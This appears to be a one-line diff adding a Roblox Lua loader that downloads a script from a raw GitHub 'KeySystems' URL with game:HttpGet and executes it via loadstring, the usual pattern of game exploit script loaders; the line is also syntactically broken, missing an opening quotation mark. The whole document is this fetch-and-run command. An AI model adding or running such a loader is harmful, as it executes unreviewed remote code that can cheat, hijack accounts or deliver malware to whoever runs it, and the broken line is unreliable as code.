@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(https://raw.githubusercontent.com/riotrapdo-spec/KeySystems/refs/heads/main/lajaj.txt"))()
